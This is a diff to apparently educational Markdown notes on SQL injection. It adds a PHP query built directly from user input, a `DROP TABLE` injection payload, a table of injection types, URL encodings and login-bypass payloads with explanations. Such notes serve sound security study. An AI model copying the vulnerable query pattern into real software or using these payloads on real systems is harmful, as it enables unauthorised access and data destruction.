@@ -93,14 +93,61 @@ CREATE TABLE logins (
 
 ## SQL Injection
 
-### Auth Bypass
+### Example MySQL query in php
 
-| Payload | Description |
+**Query:**
+```php
+$conn = new mysqli("localhost", "root", "password", "users");
+$searchInput =  $_POST['findUser'];
+$query = "select * from logins where username like '%$searchInput'";
+$result = $conn->query($query);
+```
+
+**Printing results:**
+```php
+while($row = $result->fetch_assoc() ){
+	echo $row["name"]."<br>";
+}
+```
+
+For the above example entering `1'; DROP TABLE users;--` would result in:
+
+```sql
+select * from logins where username like '%1'; DROP TABLE users;--'
+```
+
+### Types of Injection
+
+| Type                | Description                              | Use Case                        |
+|---------------------|------------------------------------------|---------------------------------|
+| In-band: Union-Based| Direct output via UNION query in specific column. | When output is displayed in a readable column. |
+| In-band: Error-Based| Triggers SQL errors to reveal query output. | When errors are shown on front-end. |
+| Blind: Boolean-Based| Uses true/false conditions to infer data. | When no output but page behavior changes. |
+| Blind: Time-Based   | Delays response with Sleep() to infer data. | When no output or behavior change, but delays detectable. |
+| Out-of-band         | Sends output to remote location (e.g., DNS). | When no direct output is accessible. |
+
+**Note:** In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.
+
+###  SQL Injection Payloads URL Encoding
+
+| Payload | URL Encoded |
 |---------|-------------|
-| `admin' or '1'='1` | Basic Auth Bypass |
-| `admin')-- -` | Basic Auth Bypass With comments |
+| '       | %27         |
+| "       | %22         |
+| #       | %23         |
+| ;       | %3B         |
+| )       | %29         |
+| -       | %2D         |
+| =       | %3D         |
 
 ### Auth Bypass Payloads
+
+MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g., `'1'='1`) returns TRUE. Use `admin' or '1'='1` to bypass authentication by ensuring the query evaluates to TRUE while balancing quotes.
+
+| Payload            | Description                     | How It Works                                   |
+|--------------------|---------------------------------|------------------------------------------------|
+| `admin' or '1'='1` | Basic Auth Bypass               | Appends TRUE condition (`'1'='1`) to bypass login check. |
+| `admin')-- -`      | Basic Auth Bypass With Comments | Closes query early with `)` and comments out rest with `--`. |
 
 ### Union Injection
 
